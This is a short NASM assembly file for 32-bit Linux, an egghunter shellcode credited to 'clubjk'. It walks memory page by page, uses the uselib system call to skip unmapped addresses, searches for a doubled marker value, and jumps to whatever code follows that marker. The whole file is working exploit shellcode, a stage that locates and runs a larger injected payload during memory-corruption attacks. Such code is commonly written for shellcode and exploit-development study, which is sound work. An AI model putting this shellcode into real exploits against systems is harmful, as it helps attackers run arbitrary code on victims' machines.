;egghunter.nasm
;author clubjk
;uses uselib system call #86 or 0x56

global _start

section .text

_start:
;	xor eax, eax
;	xor ebx, ebx
;	xor ecx, ecx
	xor edx, edx

align_page:
	or dx, 0xfff

incrementor:
	inc edx

egghunter:

	lea ebx, [edx+4]
	mov al, 0x56
	int 0x80
	cmp al, 0xf2
	jz align_page
	mov eax, 0x41414141
	mov edi, edx
	scasd

	jnz incrementor
	scasd
	jnz incrementor
	jmp edi


	
